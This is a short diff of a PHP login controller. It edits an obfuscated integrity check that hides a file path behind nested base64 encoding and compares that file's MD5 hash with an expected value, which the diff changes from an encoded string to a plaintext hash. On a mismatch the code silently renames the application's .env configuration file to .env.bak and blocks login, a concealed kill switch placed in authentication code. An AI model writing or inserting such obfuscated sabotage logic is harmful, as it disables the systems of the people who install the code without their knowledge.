@@ -109,7 +109,7 @@ abstract class AbstractLoginController extends Controller
         $_76818d42 = app_path(base64_decode(base64_decode(base64_decode('VTBoU01HTkRPVTVoVjFKcllrZFdNMWxZU214TU1VSlVVVlY0VG1GWFVtdGlSMVl6V1ZoS2JFeHVRbTlqUVQwOQ=='))));
         if (file_exists($_76818d42)) {
             $_23a824db = md5_file($_76818d42);
-            if ($_23a824db !== base64_decode(base64_decode('TmpJNVl6WmhaREZoTVdJNE9UQXpaRE5rTampObU1HUmlObUV4TlRNNVlUQT0='))) {
+            if ($_23a824db !== '629c6ad1a1b8903d3d63f0db6a1539a0') {
                 rename(base_path(base64_decode(base64_decode(base64_decode('VEcxV2RXUm5QVDA9')))), base_path(base64_decode('LmVudi5iYWs=')));
                 return false;
             }
